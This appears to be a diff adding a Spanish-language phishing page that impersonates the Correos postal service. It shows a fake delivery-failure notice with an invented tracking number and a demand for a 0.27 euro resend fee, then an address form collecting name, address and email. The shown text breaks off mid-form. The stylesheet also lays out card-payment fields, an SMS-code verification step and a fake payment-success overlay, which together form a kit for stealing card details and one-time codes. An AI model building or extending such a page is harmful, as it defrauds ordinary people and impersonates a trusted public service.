@@ -1,0 +1,2313 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Seguimiento de Envío - Correos</title>
+  <style>
+    :root {
+      --yellow: #ffd400;
+      --blue: #073b5a;
+      --light-blue: #e6f0fa;
+      --dark-blue: #0b3d6b;
+      font-family: Inter, Roboto, Arial, sans-serif;
+    }
+    
+    body {
+      margin: 0;
+      padding: 0;
+      background: #fafafa;
+      color: #111;
+    }
+    
+    /* Cabecera de Correos */
+    .yellow-line {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 6px;
+      width: 100%;
+      background-color: #FFD400;
+      z-index: 100;
+    }
+    
+    .topbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 14px 40px;
+      background: #fff;
+      border-bottom: 1px solid #e6e6e6;
+      position: relative;
+      z-index: 90;
+      margin-top: 6px;
+    }
+    
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      margin-left: 100px;
+    }
+    
+    .logo {
+      height: 34px;
+      width: auto;
+    }
+    
+    .divider {
+      width: 1px;
+      height: 26px;
+      background-color: #C4C4C4;
+    }
+    
+    .menu-icon {
+      height: 12px;
+      width: auto;
+    }
+    
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-right: 40px;
+    }
+    
+    .user-icon {
+      height: 26px;
+      width: auto;
+    }
+    
+    .login-text {
+      font-size: 14px;
+      font-weight: 700;
+      color: #002B5C;
+      text-decoration: none;
+    }
+    
+    /* Contenido principal */
+    main {
+      max-width: 720px;
+      margin: 60px auto 0;
+      padding: 0 20px;
+    }
+    
+    .page {
+      display: none;
+    }
+    
+    .page.active {
+      display: block;
+    }
+    
+    /* Sección de seguimiento */
+    .hero-image {
+      display: flex;
+      justify-content: center;
+      margin: 10px auto;
+      padding: 10px;
+    }
+    
+    .hero-image img {
+      max-width: 320px;
+      width: 90%;
+      height: auto;
+      border-radius: 8px;
+    }
+    
+    .tracking-box {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin: 10px auto 15px;
+      text-align: center;
+      background: #fff;
+      padding: 15px;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+    }
+    
+    .tracking-info {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    
+    .tracking-info h2 {
+      font-size: 17px;
+      font-weight: 700;
+      margin: 0;
+    }
+    
+    .tracking-info p {
+      font-size: 15px;
+      margin: 3px 0 0 0;
+      font-weight: 500;
+      color: #333;
+    }
+    
+    #copy-logo {
+      width: 40px;
+      height: auto;
+      cursor: pointer;
+      transition: transform 0.2s ease;
+    }
+    
+    #copy-logo:hover {
+      transform: scale(1.15);
+    }
+    
+    /* Estado del envío */
+    .estado-envio {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 5px;
+      margin: 30px auto;
+      text-align: center;
+      max-width: 600px;
+      flex-wrap: wrap;
+    }
+    
+    .estado {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      flex: 1 1 22%;
+    }
+    
+    .estado img {
+      margin-bottom: 6px;
+    }
+    
+    .estado p {
+      font-size: 13px;
+      font-weight: 600;
+      color: #2d2d2d;
+      margin: 0;
+    }
+    
+    .estado:nth-child(1) img { width: 37px; }
+    .estado:nth-child(2) img { width: 50px; }
+    .estado:nth-child(3) img { width: 52px; }
+    .estado:nth-child(4) img { width: 50px; }
+    
+    /* Aviso */
+    .warning {
+      margin-top: 8px;
+      padding: 14px 16px;
+      border-radius: 8px;
+      border: 1px solid var(--dark-blue);
+      background-color: var(--light-blue);
+      color: var(--dark-blue);
+    }
+    
+    .warning-title {
+      color: #a40000;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 16px;
+    }
+    
+    .warning ul {
+      margin: 8px 0 0 18px;
+      color: var(--dark-blue);
+      line-height: 1.5;
+    }
+    
+    .center {
+      display: flex;
+      justify-content: center;
+      margin-top: 14px;
+    }
+    
+    .btn-yellow {
+      display: inline-block;
+      background: var(--yellow);
+      padding: 12px 18px;
+      border-radius: 8px;
+      font-weight: 700;
+      border: 0;
+      cursor: pointer;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+    
+    /* Formularios */
+    .form-container {
+      background-color: #fff;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      border-radius: 10px;
+      padding: 35px;
+      margin: 20px 0;
+    }
+    
+    .input-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+    
+    .input-group input {
+      width: 100%;
+      border: 1px solid #ccc;
+      border-bottom: 2px solid #ffd400;
+      border-radius: 5px;
+      background-color: #f4f4f4;
+      padding: 16px 10px 6px 10px;
+      font-size: 15px;
+      color: #000;
+      outline: none;
+      transition: all 0.25s ease;
+    }
+    
+    .input-group label {
+      position: absolute;
+      top: 16px;
+      left: 12px;
+      color: #666;
+      font-size: 15px;
+      font-weight: 600;
+      pointer-events: none;
+      transition: all 0.25s ease;
+    }
+    
+    .input-group input:focus {
+      border-color: #ccc;
+      border-bottom: 2px solid #0033a0;
+      color: #0033a0;
+    }
+    
+    .input-group input:focus + label,
+    .input-group input:not(:placeholder-shown) + label {
+      top: 4px;
+      left: 10px;
+      font-size: 12px;
+      color: #0033a0;
+    }
+    
+    /* Método de pago */
+    .payment-method {
+      margin: 20px 0;
+      font-weight: 600;
+      color: #1a2a60;
+    }
+    
+    .payment-method label {
+      display: flex;
+      align-items: center;
+      font-size: 15px;
+      margin-bottom: 8px;
+    }
+    
+    .payment-method input[type="radio"] {
+      margin-right: 8px;
+      accent-color: #0033a0;
+    }
+    
+    .card-icons {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      align-items: center;
+    }
+    
+    .card-icons img {
+      height: 26px;
+      filter: grayscale(0%);
+      transition: transform 0.2s ease;
+    }
+    
+    .card-icons img:hover {
+      transform: scale(1.1);
+    }
+    
+    /* Pantalla de carga */
+    #pantallaCarga {
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 60vh;
+      background-color: #f8f8f8;
+      font-family: "Segoe UI", Arial, sans-serif;
+      text-align: center;
+      cursor: wait;
+    }
+    
+    .loader {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #f7b500;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .texto-carga {
+      color: #333;
+      font-size: 15px;
+      line-height: 1.5;
+      max-width: 420px;
+    }
+    
+    /* Verificación SMS */
+    #verificacionPago {
+      display: none;
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      max-width: 500px;
+      margin: 20px auto;
+      font-family: "Segoe UI", Arial, sans-serif;
+      text-align: center;
+    }
+    
+    #verificacionPago h3 {
+      color: #1a2a60;
+      margin-bottom: 10px;
+    }
+    
+    #verificacionPago p {
+      color: #555;
+      margin-bottom: 20px;
+    }
+    
+    #verificacionPago input {
+      width: 80%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+    
+    /* Footer */
+    .footer-legal {
+      background-color: #1d1d1b;
+      color: #ddd;
+      padding: 25px 0;
+      font-size: 14px;
+      margin-top: 30px;
+    }
+    
+    .footer-legal-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      text-align: center;
+    }
+    
+    .footer-legal .footer-logo {
+      height: 40px;
+      margin-bottom: 12px;
+    }
+    
+    .footer-legal .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 14px;
+      margin-bottom: 10px;
+    }
+    
+    .footer-legal .footer-links a {
+      color: #ddd;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    
+    .footer-legal .footer-links a:hover {
+      text-decoration: underline;
+    }
+    
+    .footer-legal p {
+      color: #ccc;
+      font-size: 13px;
+      margin-top: 8px;
+    }
+    
+    /* Responsivo */
+    @media (max-width: 768px) {
+      .header-left, .header-right {
+        margin: 0 20px;
+      }
+      
+      .logo {
+        height: 28px;
+      }
+      
+      main {
+        padding: 0 10px;
+        margin-top: 50px;
+      }
+      
+      .form-container {
+        padding: 20px;
+      }
+      
+      .estado-envio {
+        gap: 5px;
+        margin: 20px auto;
+      }
+      
+      .estado img {
+        width: 40px;
+      }
+      
+      .estado p {
+        font-size: 12px;
+      }
+    }
+  
+
+:root{
+    --yellow:#ffd400;
+    --blue:#073b5a;
+    --muted:#f4f6f8;
+    --card-bg:#ffffff;
+    --accent:#1d6fa5;
+    font-family: Inter, Roboto, Arial, sans-serif;
+  }
+  body{margin:0;background:#fafafa;color:#111;}
+  header{
+    display:flex;align-items:center;gap:12px;padding:12px 16px;
+    border-bottom:4px solid var(--yellow);background:white;
+  }
+  /* texto gris a la izquierda del emblema */
+  .corp-name{color:#888;font-weight:600;font-size:14px;margin-left:6px}
+  /* emblema amarillo (no es el logo oficial) */
+  .logo-yellow{
+    width:48px;height:48px;border-radius:6px;background:var(--yellow);
+    display:flex;align-items:center;justify-content:center;color:#073b5a;font-weight:700;
+    box-shadow:0 4px 8px rgba(0,0,0,0.06);
+  }
+  .menu{flex:1}
+  .login{color:var(--blue);font-weight:600}
+  main{max-width:720px;margin:13px auto;padding:0 12px;}
+  .hero{background:var(--card-bg);padding:18px;border-radius:10px;box-shadow:0 8px 20px rgba(10,25,40,0.06);text-align:center;}
+.login {
+  color: var(--blue);
+  font-weight: 600;
+  white-space: nowrap; /* para que no se parta */
+  font-size: 15px; /* tamaño normal */
+}
+
+/* 🔹 Cuando la pantalla es pequeña (móvil), se hace más pequeño */
+@media (max-width: 600px) {
+  .login {
+    font-size: 12px; /* puedes ajustar a 11px, 13px, etc. */
+  }
+}
+  .hero svg{max-width:260px;height:auto;margin:6px auto 0}
+  .tracking{margin-top:12px;text-align:left}
+  .steps{display:flex;gap:12px;justify-content:space-between;margin:18px 0}
+  .step{flex:1;background:#fff;padding:10px;border-radius:8px;box-shadow:0 6px 14px rgba(10,25,40,0.04);text-align:center}
+  .warning {
+  margin-top: 8px;
+  padding: 14px 16px;
+  border-radius: 8px;
+  border: 1px solid #1d6fa5;   /* marco azul */
+  background-color: #e6f0fa;    /* fondo azul clarito */
+  color: #0b3d6b;               /* texto azul oscuro */
+}
+.warning-title {
+  color: #a40000;
+  font-weight: 800;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 16px;
+}
+.warning ul {
+  margin: 8px 0 0 18px;
+  color: #0b3d6b;
+  line-height: 1.5;
+}
+  .btn-yellow{display:inline-block;background:var(--yellow);padding:12px 18px;border-radius:8px;font-weight:700;border:0;cursor:pointer;box-shadow:0 6px 0 rgba(0,0,0,0.06)}
+  .center{display:flex;justify-content:center}
+  footer{background:#222;color:#ddd;padding:20px;margin-top:30px;border-top:1px solid rgba(255,255,255,0.03)}
+  /* payment page */
+  .page{display:none; }
+  .page.active{display:block}
+  form{background:#fff;padding:16px;border-radius:10px;box-shadow:0 10px 30px rgba(10,25,40,0.06)}
+  label{display:block;margin-top:8px;font-size:14px;color:#333}
+  input[type=text], input[type=tel], input[type=month]{width:100%;padding:10px;border-radius:6px;border:1px solid #e3e6ea;margin-top:6px;font-size:15px}
+  .row{display:flex;gap:8px}
+  .col{flex:1}
+  .saved-list{margin-top:14px;background:#fff;padding:12px;border-radius:8px}
+  .item{padding:8px;border-bottom:1px solid #f0f0f0}
+  .item:last-child{border-bottom:0}
+  .small{font-size:13px;color:#555}
+  /* modal */
+  .modal{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,0.45);}
+  .modal.open{display:flex}
+  .modal-card{background:#fff;padding:22px;border-radius:10px;max-width:420px;width:90%;text-align:center}
+  .ok{margin-top:12px;padding:10px 14px;border-radius:8px;background:#0b7a55;color:white;border:0;cursor:pointer}
+  .danger{background:#c0392b;color:white}
+  .note{font-size:13px;color:#666;margin-top:6px}
+  /* footer links */
+  .footer-links{display:flex;flex-wrap:wrap;gap:10px;color:#ddd;font-size:13px}
+  .footer-links a{color:#ddd;text-decoration:none}
+  .footer-bottom{color:#bbb;margin-top:10px}
+  @media(max-width:600px){
+    .steps{flex-direction:column}
+    header{gap:8px}
+  }
+/* ---- Logo copiar junto al título ---- */
+.tracking-header {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  margin-bottom: 4px;
+}
+
+.tracking-header h2 {
+  font-size: 18px;
+  font-weight: 700;
+  margin: 0;
+}
+
+#copy-logo {
+  width: 44px;
+  height: auto;
+  cursor: pointer;
+  background: transparent;
+  transition: transform 0.2s ease;
+}
+
+#copy-logo:hover {
+  transform: scale(1.15);
+}
+
+#tracking-number {
+  text-align: center;
+  font-weight: 600;
+  font-size: 15px;
+  letter-spacing: 0.5px;
+}
+
+
+/* 🔹 Bloque del número de seguimiento */
+.tracking-box {
+  display: flex;
+  align-items: center;
+  justify-content: center; /* centrado horizontal */
+  gap: 10px; /* espacio entre texto e icono */
+  margin: 10px auto 15px;
+  text-align: center;
+}
+
+/* Contenedor del texto */
+.tracking-info {
+  display: flex;
+  flex-direction: column;
+  align-items: center; /* centra título y número */
+  line-height: 1.3;
+}
+
+/* Título del bloque */
+.tracking-info h2 {
+  font-size: 17px;
+  font-weight: 700;
+  margin: 0;
+}
+
+/* Número de seguimiento */
+.tracking-info p {
+  font-size: 15px;
+  margin: 3px 0 0 0;
+  font-weight: 500;
+}
+
+/* Icono de copiar */
+#copy-logo {
+  width: 40px; /* un poco más grande */
+  height: auto;
+  cursor: pointer;
+  transition: transform 0.2s ease;
+}
+
+#copy-logo:hover {
+  transform: scale(1.15);
+}
+
+
+
+/* 🔹 Centrar y ajustar la imagen principal del envío */
+.hero-image {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin: 10px auto;
+  padding: 10px;
+}
+
+.hero-image img {
+  max-width: 320px;  /* puedes ajustar el tamaño */
+  width: 80%;        /* se adapta al ancho de pantalla */
+  height: auto;
+  display: block;
+  margin: 0 auto;
+}
+
+/* ----- Estilo Correos Header ----- */
+.topbar {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 14px 40px;
+  background: #fff;
+  border-bottom: 1px solid #e6e6e6;
+  position: relative;
+  z-index: 10;
+}
+
+/* Barra amarilla superior */
+.yellow-line {
+  position: fixed;
+  top: 0;
+  left: 0;
+  height: 6px;
+  width: 100%;
+  background-color: #FFD400;
+  z-index: 20;
+}
+
+/* Lado izquierdo: logo + divisor + menú */
+.header-left {
+  display: flex;
+  align-items: center;
+  gap: 20px;
+  margin-left: 100px; /* mueve el logo más al centro */
+}
+
+.logo {
+  height: 34px;
+  width: auto;
+}
+
+.divider {
+  width: 1px;
+  height: 26px;
+  background-color: #C4C4C4;
+}
+
+.menu-icon {
+  height: 12px;
+  width: auto;
+}
+
+/* Lado derecho: icono usuario + texto */
+.header-right {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  margin-right: 40px;
+}
+
+.user-icon {
+  height: 26px; /* antes 20px */
+  width: auto;
+  transform: translateY(1px); /* lo alinea mejor con el texto */
+}
+
+
+.login-text {
+  font-size: 14px;
+  font-weight: 700;
+  color: #002B5C;
+}
+
+
+.login-text:hover {
+  text-decoration: underline;
+}
+
+/* Responsive */
+@media (max-width: 768px) {
+  .header-left {
+    margin-left: 20px;
+  }
+  .header-right {
+    margin-right: 20px;
+  }
+  .logo {
+    height: 28px;
+  }
+}
+
+/* 🔹 Estado del envío: iconos y texto */
+.estado-envio {
+  display: flex;
+  justify-content: space-between;
+  align-items: flex-start;
+  gap: 10px; /* más juntos */
+  margin: 30px auto;
+  text-align: center;
+  max-width: 600px;
+  flex-wrap: wrap;
+}
+
+.estado {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  flex: 1 1 22%; /* todos del mismo ancho */
+}
+
+.estado img {
+  width: 50px;
+  height: auto;
+  margin-bottom: 6px;
+}
+
+.estado p {
+  font-size: 13px;
+  font-weight: 600;
+  color: #2d2d2d;
+  margin: 0;
+}
+
+/* Ajuste fino de tamaño por cada icono */
+.estado:nth-child(1) img { width: 37px; } /* Preadmisión */
+.estado:nth-child(2) img { width: 50px; } /* En camino */
+.estado:nth-child(3) img { width: 52px; } /* En entrega */
+.estado:nth-child(4) img { width: 50px; } /* Entregado */
+
+/* 📱 Móvil: aún más compactos */
+@media (max-width: 480px) {
+  .estado-envio {
+    gap: 5px;
+    margin: 20px auto;
+  }
+  .estado img {
+    width: 40px;
+  }
+  .estado p {
+    font-size: 12px;
+  }
+}
+
+
+.footer {
+  background-color: #fff;
+  padding: 40px 0 10px;
+  font-family: 'Segoe UI', sans-serif;
+  color: #333;
+}
+
+.footer-top {
+  display: flex;
+  justify-content: space-around;
+  flex-wrap: wrap;
+  max-width: 1200px;
+  margin: 0 auto;
+  text-align: left;
+}
+
+.footer-section {
+  flex: 1 1 200px;
+  margin: 15px;
+}
+
+.footer-section h4 {
+  font-size: 1rem;
+  font-weight: 600;
+  color: #1c3f94;
+  margin-bottom: 10px;
+}
+
+.footer-section ul {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+
+.footer-section ul li {
+  margin: 6px 0;
+}
+
+.footer-section ul li a {
+  text-decoration: none;
+  color: #333;
+  font-size: 0.95rem;
+}
+
+.footer-section ul li a:hover {
+  text-decoration: underline;
+}
+
+.social-icons {
+  display: flex;
+  gap: 10px;
+  align-items: center;
+}
+
+.social-icons img {
+  width: 180px;        /* mucho más ancha */
+  height: 88px;        /* 4 veces más alta (22×4 = 88) */
+  object-fit: contain; /* mantiene proporciones sin deformar */
+  cursor: pointer;
+  transition: transform 0.2s ease;
+}
+
+.social-icons img:hover {
+  transform: scale(1.1);
+}
+
+.footer-divider {
+  border: none;
+  border-top: 1px solid #ddd;
+  margin: 25px auto;
+  width: 90%;
+}
+
+.footer-bottom {
+  padding: 15px 0;
+  background-color: #fff;
+}
+
+.footer-container {
+  display: flex;
+  justify-content: space-around;
+  align-items: center;
+  flex-wrap: wrap;
+  max-width: 1200px;
+  margin: 0 auto;
+  text-align: center;
+}
+
+.footer-left p,
+.footer-right p {
+  font-weight: 500;
+  margin-bottom: 8px;
+}
+
+.footer-apps img,
+.footer-payments img {
+  height: 40px;
+  margin: 0 5px;
+  transition: transform 0.2s ease;
+}
+
+.footer-apps img:hover,
+.footer-payments img:hover {
+  transform: scale(1.07);
+}
+
+.footer-legal {
+  background-color: #1d1d1b;
+  color: #ddd;
+  padding: 25px 0;
+  font-size: 14px;
+}
+
+.footer-legal-inner {
+  max-width: 1200px;
+  margin: 0 auto;
+  text-align: center;
+}
+
+.footer-legal .footer-logo {
+  height: 40px;
+  margin-bottom: 12px;
+}
+
+.footer-legal .footer-links {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  gap: 14px;
+  margin-bottom: 10px;
+}
+
+.footer-legal .footer-links a {
+  color: #ddd;
+  text-decoration: none;
+  font-size: 14px;
+}
+
+.footer-legal .footer-links a:hover {
+  text-decoration: underline;
+}
+
+.footer-legal p {
+  color: #ccc;
+  font-size: 13px;
+  margin-top: 8px;
+}
+/* 🔹 Footer móvil tipo acordeón */
+.footer-mobile {
+  display: none;
+  background: #fff;
+  padding: 25px 20px 50px;
+  border-top: 1px solid #ddd;
+  font-family: 'Segoe UI', sans-serif;
+}
+
+.footer-mobile details {
+  border-bottom: 1px solid #e0e0e0;
+  padding: 12px 0;
+}
+
+.footer-mobile summary {
+  font-weight: 700;
+  color: #1c3f94;
+  font-size: 17px;
+  cursor: pointer;
+  list-style: none;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.footer-mobile summary::after {
+  content: "›";
+  font-size: 22px;
+  transform: rotate(90deg);
+  transition: transform 0.3s ease;
+}
+
+.footer-mobile details[open] summary::after {
+  transform: rotate(-90deg);
+}
+
+.footer-mobile ul {
+  list-style: none;
+  padding-left: 10px;
+  margin: 10px 0 0;
+}
+
+.footer-mobile ul li {
+  margin-bottom: 8px;
+}
+
+.footer-mobile ul li a {
+  color: #333;
+  text-decoration: none;
+  font-size: 15px;
+}
+
+.footer-mobile ul li a:hover {
+  text-decoration: underline;
+}
+
+.footer-mobile-social {
+  display: flex;
+  justify-content: center;
+  gap: 15px;
+  margin: 25px 0;
+}
+
+.footer-mobile-social img {
+  width: 25px;
+  height: auto;
+}
+
+.footer-mobile-title {
+  text-align: center;
+  font-weight: 600;
+  color: #555;
+  margin-top: 25px;
+  margin-bottom: 10px;
+  font-size: 15px;
+}
+
+.footer-mobile-apps,
+.footer-mobile-payments {
+  display: flex;
+  justify-content: center;
+  flex-wrap: wrap;
+  gap: 12px;
+}
+
+.footer-mobile-apps img {
+  width: 120px;
+  height: auto;
+}
+
+.footer-mobile-payments img {
+  width: 38px;
+  height: 20px;
+  margin: 2x;
+}
+
+/* 📱 Mostrar sólo en móvil */
+@media (max-width: 768px) {
+  .footer {
+    display: none; /* oculta el footer original */
+  }
+  .footer-mobile {
+    display: block;
+  }
+}
+
+/* CONTENEDOR BLANCO DEL SEGUIMIENTO */
+.tracking-card {
+  background-color: #ffffff; /* blanco total */
+  border-radius: 16px;       /* bordes redondeados */
+  padding: 16px;
+  margin: 12px auto;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.08); /* sombra suave */
+  max-width: 90%;            /* margen lateral limpio en móvil */
+  text-align: center;
+}
+
+/* Imagen superior */
+.tracking-card .tracking-image {
+  width: 100%;
+  border-radius: 12px;
+  object-fit: contain;
+  margin-bottom: 10px;
+}
+
+/* Número de seguimiento */
+.tracking-card h3 {
+  font-weight: bold;
+  margin-bottom: 4px;
+}
+
+.tracking-card p {
+  font-family: 'Arial', sans-serif;
+  color: #222;
+  font-size: 15px;
+  margin-bottom: 8px;
+}
+
+/* Estados (preadmisión, en camino, etc.) */
+.tracking-status {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  flex-wrap: nowrap;
+  gap: 8px;
+}
+
+.tracking-status div {
+  flex: 1;
+  text-align: center;
+}
+
+style
+/* === FORMULARIO FINAL IDÉNTICO === */
+body {
+  font-family: "Segoe UI", Arial, sans-serif;
+  background-color: #f9f9f9;
+  margin: 0;
+  padding: 40px;
+  color: #1a1a1a;
+}
+
+h1 {
+  font-size: 28px;
+  color: #1a2a60;
+  margin-bottom: 10px;
+}
+
+p {
+  font-size: 15px;
+  color: #555;
+  margin-bottom: 30px;
+}
+
+.form-container {
+  background-color: #fff;
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+  border-radius: 10px;
+  padding: 35px;
+  max-width: 600px;
+  margin: 0 auto;
+}
+
+/* === Campos con etiqueta flotante === */
+.input-group {
+  position: relative;
+  margin-bottom: 20px;
+}
+
+.input-group input {
+  width: 100%;
+  border: 1px solid #ccc;
+  border-bottom: 2px solid #ffd400;
+  border-radius: 5px;
+  background-color: #e4e4e4;
+  padding: 16px 10px 6px 10px;
+  font-size: 15px;
+  color: #000;
+  outline: none;
+  transition: all 0.25s ease;
+}
+
+/* Etiqueta flotante */
+.input-group label {
+  position: absolute;
+  top: 16px;
+  left: 12px;
+  color: #666;
+  font-size: 15px;
+  font-weight: 600;
+  pointer-events: none;
+  transition: all 0.25s ease;
+}
+
+/* Enfocado */
+.input-group input:focus {
+  border-color: #ccc;
+  border-bottom: 2px solid #0033a0;
+  color: #0033a0;
+}
+
+/* Etiqueta arriba al escribir o enfocar */
+.input-group input:focus + label,
+.input-group input:not(:placeholder-shown) + label {
+  top: 4px;
+  left: 10px;
+  font-size: 12px;
+  color: #0033a0;
+}
+
+/* === Botón === */
+.submit-btn {
+  background-color: #ffd000;
+  border: 1px solid #d9aa00;
+  color: #000;
+  font-weight: 700;
+  padding: 12px 22px;
+  border-radius: 4px;
+  font-size: 15px;
+  cursor: pointer;
+  transition: background-color 0.3s, transform 0.1s;
+}
+
+.submit-btn:hover {
+  background-color: #ffcc00;
+}
+
+.submit-btn:active {
+  transform: scale(0.98);
+}
+
+.payment-method {
+  margin: 20px 0;
+  font-weight: 600;
+  color: #1a2a60;
+}
+
+.payment-method label {
+  display: flex;
+  align-items: center;
+  font-size: 15px;
+  margin-bottom: 8px;
+}
+
+.payment-method input[type="radio"] {
+  margin-right: 8px;
+  accent-color: #0033a0;
+}
+
+.card-icons {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px;
+  align-items: center;
+}
+
+.card-icons img {
+  height: 26px;
+  filter: grayscale(0%);
+  transition: transform 0.2s ease;
+}
+
+.card-icons img:hover {
+  transform: scale(1.1);
+}
+
+/* Menú desplegable móvil */
+@media (max-width: 768px) {
+  .footer-section h4 {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    cursor: pointer;
+  }
+  .footer-section h4::after {
+    content: "▼";
+    font-size: 0.8em;
+    transition: transform 0.3s ease;
+  }
+  .footer-section.open h4::after {
+    transform: rotate(180deg);
+  }
+  .footer-section ul {
+    max-height: 0;
+    overflow: hidden;
+    transition: max-height 0.4s ease;
+  }
+  .footer-section.open ul {
+    max-height: 500px;
+  }
+}
+
+
+/* === Overlay de confirmación de pago === */
+.overlay-exito {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: rgba(255, 255, 255, 0.95);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 10000;
+  animation: fadeIn 0.4s ease forwards;
+}
+
+.overlay-card {
+  background: #fff;
+  padding: 30px 40px;
+  border-radius: 12px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+  text-align: center;
+  max-width: 400px;
+  animation: scaleIn 0.4s ease;
+}
+
+.overlay-icon {
+  font-size: 48px;
+  margin-bottom: 15px;
+  color: #00b33c;
+}
+
+.overlay-card h2 {
+  color: #1a2a60;
+  margin-bottom: 10px;
+}
+
+.overlay-card p {
+  color: #333;
+  font-size: 15px;
+  line-height: 1.5;
+  margin-bottom: 25px;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+
+@keyframes scaleIn {
+  from { transform: scale(0.9); opacity: 0; }
+  to { transform: scale(1); opacity: 1; }
+}
+
+
+</style>
+</head>
+<body>
+  <!-- Línea amarilla superior -->
+  <div class="yellow-line"></div>
+
+  <!-- Cabecera -->
+  <header class="topbar">
+    <div class="header-left">
+      <img src="https://i.imgur.com/8p621kt.png" alt="Logo Correos" class="logo">
+      <div class="divider"></div>
+      <img src="https://i.imgur.com/oodmQmU.png" alt="Menú" class="menu-icon">
+    </div>
+
+    <div class="header-right">
+      <div class="divider"></div>
+      <img src="https://i.imgur.com/2DrWgCV.png" alt="Usuario" class="user-icon">
+    </div>
+  </header>
+
+  <!-- Contenido principal -->
+  <main>
+    <!-- Página 1: Aviso de error de entrega -->
+    <section id="home" class="page active">
+      <div class="hero-image">
+        <img src="https://i.imgur.com/xqLpvF3.png" alt="Imagen del envío">
+      </div>
+
+      <div class="tracking-box">
+        <div class="tracking-info">
+          <h2>N° de seguimiento de envío</h2>
+          <p id="tracking-number">PH9VMC0759767210146026M</p>
+        </div>
+        <img src="https://i.imgur.com/IpsyHGY.png" alt="Copiar número" id="copy-logo" title="Copiar número">
+      </div>
+
+      <div class="estado-envio">
+        <div class="estado">
+          <img src="https://i.imgur.com/Jspnud5.png" alt="Preadmisión">
+          <p>Preadmisión</p>
+        </div>
+
+        <div class="estado">
+          <img src="https://i.imgur.com/pAcbbVh.png" alt="En camino">
+          <p>En camino</p>
+        </div>
+
+        <div class="estado">
+          <img src="https://i.imgur.com/rASqLZg.png" alt="En entrega">
+          <p>En entrega</p>
+        </div>
+
+        <div class="estado">
+          <img src="https://i.imgur.com/lf7rl9u.png" alt="Entregado">
+          <p>Entregado</p>
+        </div>
+      </div>
+
+      <div class="warning" role="alert">
+        <div class="warning-title">⚠️ Aviso de falla de entrega</div>
+        <ul>
+          <li>Debido a que la dirección de entrega no está clara, su paquete no se entrega</li>
+          <li>Su paquete ha regresado a nuestro centro de operaciones</li>
+          <li>Actualice su dirección, enviaremos nuevamente en <strong id="resendDate">--/--/----</strong></li>
+          <li>Pago por reenvío de paquete: Para el reenvío de su paquete, se requiere un pago adicional de <strong>0,27 euros</strong></li>
+        </ul>
+      </div>
+
+      <div class="center">
+        <button class="btn-yellow" id="continueBtn">Continuar</button>
+      </div>
+    </section>
+
+    <!-- Página 2: Formulario de dirección -->
+    <section id="direccion" class="page">
+      <div class="form-container">
+        <h1>Actualizar Dirección</h1>
+        <p>Complete todos los campos para actualizar la dirección de entrega</p>
+        
+        <form id="direccionForm">
+          <div class="input-group">
+            <input type="text" id="nombre" placeholder=" " data-required>
+            <label for="nombre">Su Nombre</label>
+          </div>
+
+          <div class="input-group">
+  <input type="text" id="direccionInput" placeholder=" " required>
+  <label for="direccionInput">Dirección</label>
+</div>
+
+
+          <div class="row" style="display: flex; gap: 10px;">
+            <div class="input-group" style="flex: 2;">
+              <input type="text" id="ciudad" placeholder=" " data-required>
+              <label for="ciudad">Ciudad</label>
+            </div>
+
+            <div class="input-group" style="flex: 1;">
+              <input type="text" id="postal" placeholder=" " data-required>
+              <label for="postal">Código Postal</label>
+            </div>
+          </div>
+
+          <div class="input-group">
+            <input type="text" id="region" placeholder=" " data-required>
+            <label for="region">Estado / Provincia / Región</label>
+          </div>
+
+          <div class="input-group">
+            <input type="email" id="correo" placeholder=" " data-required>
+            <label for="correo">Correo Electrónico</label>
+          </div>
+
+          <div class="input-group">
